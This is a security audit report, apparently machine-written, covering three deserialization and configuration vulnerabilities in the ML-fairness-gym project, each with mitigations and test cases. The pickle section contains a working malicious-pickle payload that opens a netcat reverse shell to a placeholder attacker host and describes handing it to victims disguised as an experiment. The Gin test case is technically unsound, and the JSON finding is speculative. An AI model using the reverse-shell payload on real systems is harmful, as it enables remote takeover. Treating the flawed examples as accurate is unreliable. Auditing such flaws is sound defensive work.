## Combined Vulnerability List

This document summarizes the identified vulnerabilities in the ML-fairness-gym project. Each vulnerability is described in detail, including its potential impact, rank, and steps for exploitation and mitigation.

### 1. Unsafe Gin Configuration Loading / Code Injection via Gin Configuration File / Arbitrary Code Execution via Malicious Gin Configuration Files

* **Vulnerability Name:** Unsafe Gin Configuration Loading / Code Injection via Gin Configuration File / Arbitrary Code Execution via Malicious Gin Configuration Files
* **Description:**
    1. An attacker crafts a malicious Gin configuration file (e.g., `malicious.gin`). This file contains Gin bindings that execute arbitrary Python code when the configuration is parsed. Gin configuration files in this project are processed using `gin.parse_config_file()`.
    2. The attacker convinces a user to run the ML-fairness-gym with this malicious configuration file, for example by sending it via email or hosting it on a website and tricking the user into downloading and using it.
    3. The user executes the runner script, e.g., `python -m runner --gin_config_path=malicious.gin`.
    4. The `runner.py` script uses `gin.parse_config_file(FLAGS.gin_config_path)` to parse the configuration file.
    5. Gin executes the malicious bindings in `malicious.gin`, leading to arbitrary code execution on the user's machine.
* **Impact:** Arbitrary code execution. An attacker can execute arbitrary Python code on the machine of a user running ML-fairness-gym, potentially leading to data theft, system compromise, or other malicious activities.
* **Vulnerability Rank:** Critical
* **Currently Implemented Mitigations:** None. The project uses Gin extensively for configuration without any apparent security measures to prevent arbitrary code execution through configuration files.
* **Missing Mitigations:**
    - Sandboxing or isolation of Gin configuration parsing: Execute Gin parsing in a restricted environment with limited permissions to prevent system-level damage from malicious code.
    - Input validation and sanitization: Implement checks and sanitization for Gin configuration files to detect and neutralize potentially malicious bindings before parsing. However, due to Gin's flexibility, robust input validation is challenging.
    - Security warnings: Warn users about the risks of running ML-fairness-gym with untrusted Gin configuration files and advise them to only use configurations from trusted sources. Add prominent security warnings in the documentation, especially in sections related to configuration and running experiments.
* **Preconditions:**
    - The user must run ML-fairness-gym with a malicious Gin configuration file provided by the attacker.
    - Gin library must be able to execute Python code from configuration files, which is its intended design.
* **Source Code Analysis:**
    1. `runner.py`: This script is the main entry point for running experiments. It uses `gin.parse_config_file(FLAGS.gin_config_path)` to load the experiment configuration.
    ```python
    # File: /code/runner.py
    import gin
    ...
    def main(argv):
      ...
      gin.parse_config_file(FLAGS.gin_config_path)
      runner = runner_lib.Runner()
      ...
    ```
    2. `runner_lib.py`: The `Runner` class uses Gin configurable classes for environments, agents, and metrics. This design relies on Gin's configuration and dependency injection mechanism, which includes executing Python code defined in Gin configuration files. The `@gin.configurable` decorator is used throughout the codebase, enabling Gin to inject and configure objects based on the loaded configuration files.
    ```python
    # File: /code/runner_lib.py
    import gin
    import attr
    ...
    @gin.configurable
    @attr.s
    class Runner(object):
      ...
    ```
    3. Gin's design allows arbitrary Python code execution through bindings in configuration files. For example, a Gin configuration file can define bindings like `Runner.env_class = @os.system` and then trigger code execution by setting parameters or calling functions defined in the configuration.
    ```mermaid
    graph LR
    A[runner.py] --> B(gin.parse_config_file);
    B --> C[Malicious Config File];
    C --> D(Arbitrary Code Execution);
    ```
* **Security Test Case:**
    1. Create a malicious Gin configuration file named `malicious_config.gin` with the following content:
    ```gin
    import os
    import gin

    @gin.configurable
    def malicious_function():
        os.system('touch /tmp/pwned') # Example malicious command
        return 1

    Runner.env_class = @test_util.DummyEnv
    Runner.agent_class = @test_util.DummyAgent
    Runner.metric_classes = {'num_steps': @test_util.DummyMetric}
    Runner.num_steps = 10
    Runner.seed = 4321
    Runner.report_fn = @malicious_function
    ```
    2. Run the runner script with the malicious configuration file:
    ```bash
    python -m runner --gin_config_path=malicious_config.gin --output_path=/tmp/output.json
    ```
    3. Check if the file `/tmp/pwned` is created. If the file exists, it indicates that arbitrary code execution was successful, confirming the vulnerability.
    ```bash
    ls /tmp/pwned
    ```
    If the command lists `/tmp/pwned`, the vulnerability is confirmed.


### 2. Insecure Deserialization in History Serialization/Deserialization

* **Vulnerability Name:** Insecure Deserialization in History Serialization/Deserialization
* **Description:**
    - The `FairnessEnv` class uses `simplejson` library with `GymEncoder` for serializing and deserializing the environment history using `serialize_history()` and potentially during metric computations via `_simulate` and `_extract_history`.
    - While `GymEncoder` attempts to handle `np.random.RandomState` and other Gym objects, there is a risk of insecure deserialization if a malicious actor can craft a history object that, when deserialized, leads to arbitrary code execution.
    - Specifically, the `GymEncoder` handles 'callable' types by storing their name and enums with `__enum__` key. If these are not handled securely during deserialization, they could be a potential attack vector. Furthermore, custom `Params` and `State` objects have `asdict()` method called and `to_json()` which might have insecure deserialization issues if attributes are not handled carefully.
* **Impact:** High: If exploited, this vulnerability could allow an attacker to achieve arbitrary code execution by providing a crafted serialized history object to be loaded by the ML-fairness-gym library. This could occur if history files are stored and re-loaded, or during complex metric calculations that involve serialization and deserialization of environment states.
* **Vulnerability Rank:** High
* **Currently Implemented Mitigations:**
    - Limited Type Handling in `GymEncoder`: The `GymEncoder` attempts to handle specific types like `RandomState`, `enum.Enum`, `callable`, `np.ndarray`, `nx.Graph`, `Params`, and `State`. However, this might not be sufficient to prevent all insecure deserialization attacks.
* **Missing Mitigations:**
    - Secure Deserialization Practices: Implement secure deserialization practices. Avoid using `eval` or similar unsafe methods during deserialization. If possible, rely on safer alternatives for handling custom objects or restrict deserialization to only allow pre-defined safe types.
    - Input Validation for History Objects: Implement robust input validation for history objects before deserialization to ensure they conform to expected schemas and do not contain malicious data.
    - Consider using safer serialization formats: Investigate using safer serialization formats that are less prone to code execution vulnerabilities compared to JSON when dealing with complex Python objects.
* **Preconditions:**
    - An attacker needs to be able to supply a maliciously crafted serialized history, potentially through:
        - Compromising a stored history file.
        - Intercepting and modifying history data during transmission, if history is transmitted across networks.
        - Tricking a user or developer into loading a malicious history for debugging or analysis.
* **Source Code Analysis:**
    - File: `/code/core.py`
        - `GymEncoder` class is used for JSON serialization and deserialization.
        - `to_json()` function uses `GymEncoder`.
        - `serialize_history()` method in `FairnessEnv` uses `to_json()` to serialize history.
        - Metric class's `_simulate` and `_extract_history` might involve deserialization when working with environment history although not explicitly shown in the provided code.
    ```mermaid
    graph LR
    A[FairnessEnv.serialize_history()] --> B(core.to_json);
    B --> C(GymEncoder);
    C --> D[JSON Serialization of History];
    E[Metric._extract_history() or _simulate()] --> F[JSON Deserialization of History];
    F --> C;
    C --> G(Potential Insecure Deserialization);
    ```
* **Security Test Case:**
    1. Craft a malicious JSON payload that, when deserialized by `GymEncoder`, attempts to execute arbitrary code (e.g., using a callable object or manipulated state). This requires deeper code analysis of `GymEncoder` and potentially `simplejson` to identify specific vulnerabilities. A simplified example might involve trying to serialize and deserialize a callable and check if it can be invoked upon deserialization, although `GymEncoder` attempts to serialize callable names rather than the callable itself.
    2. Modify a test or example script to load this malicious JSON payload as environment history or state.
    3. Run the modified script and observe if arbitrary code execution occurs (e.g., by checking for creation of a file or network activity).
    4. If code execution is successful, it confirms the insecure deserialization vulnerability.


### 3. Pickle Deserialization Vulnerability

* **Vulnerability Name:** Pickle Deserialization Vulnerability
* **Description:** A malicious actor could craft a pickle file containing malicious code and replace the legitimate embedding file used by the ML-fairness-gym. When a user loads a simulation environment that uses these embeddings, the `pickle.load` function will deserialize the malicious pickle file, leading to arbitrary code execution on the user's machine.
* **Impact:** Critical. Arbitrary code execution on the user's machine. An attacker could gain full control of the user's system, steal sensitive data, or install malware.
* **Vulnerability Rank:** Critical
* **Currently Implemented Mitigations:** No mitigations are currently implemented in the project to prevent pickle deserialization vulnerabilities.
* **Missing Mitigations:**
    - Replace `pickle` with a safer serialization format like JSON or YAML for loading embedding data.
    - Implement input validation and sanitization for the embedding file path to ensure only trusted files are loaded.
    - Implement integrity checks for the embedding files to detect tampering.
* **Preconditions:**
    - The user must download and use a maliciously crafted simulation environment that includes a malicious pickle file.
    - The user must run a simulation using this malicious environment.
* **Source Code Analysis:**
    - File: `/code/environments/recommenders/movie_lens_utils.py`
    - Step 1: The function `load_embeddings(env_config)` is responsible for loading embedding data.
    - Step 2: Inside `load_embeddings`, the code determines the file type based on the suffix of `env_config.embeddings_path`.
    - Step 3: If the suffix is `.pkl` or `.pickle`, it uses `pickle.load` to deserialize the data from the file.
    ```python
    File: /code/environments/recommenders/movie_lens_utils.py
    82 def load_embeddings(env_config):
    ...
    89   suffix = pathlib.Path(path).suffix
    90   if suffix == '.json':
    91     loader = json
    92     logging.info('Reading a json file. %s', path)
    93   elif suffix in ('.pkl', '.pickle'):
    94     loader = pickle
    95     logging.info('Reading a pickle file. %s', path)
    96   else:
    97     raise ValueError('Unrecognized file type! %s' % path)
    98
    99   embedding_dict = loader.load(file_util.open(path, 'rb'))
    ```
    - Step 4: An attacker can replace the file specified by `env_config.embeddings_path` with a malicious pickle file.
    - Step 5: When the user runs a simulation using this environment, `pickle.load` will execute the malicious code embedded in the pickle file.

* **Security Test Case:**
    1. Create a malicious pickle file (`malicious_embeddings.pkl`) containing code to execute a reverse shell or similar payload.
    ```python
    import pickle
    import os
    import socket

    class EvilPickle(object):
        def __reduce__(self):
            cmd = "nc -e /bin/bash <attacker_ip> <attacker_port>" # Replace with attacker's IP and port
            return (os.system, (cmd,))

    payload = EvilPickle()
    pickle.dump(payload, open("malicious_embeddings.pkl", "wb"))
    ```
    2. Create a malicious simulation environment configuration file or modify an existing one to point `embeddings_path` to `malicious_embeddings.pkl`.
    3. Distribute this malicious simulation environment to the victim, disguised as a legitimate fairness experiment.
    4. The victim downloads and runs the ML-fairness-gym framework with the malicious simulation environment.
    5. The ML-fairness-gym framework loads the malicious pickle file using `pickle.load` in `environments/recommenders/movie_lens_utils.py`.
    6. The malicious code in `malicious_embeddings.pkl` is executed, and the attacker gains a reverse shell on the victim's machine.
    7. Verify the vulnerability by checking for a connection on the attacker's listening port after the victim runs the simulation.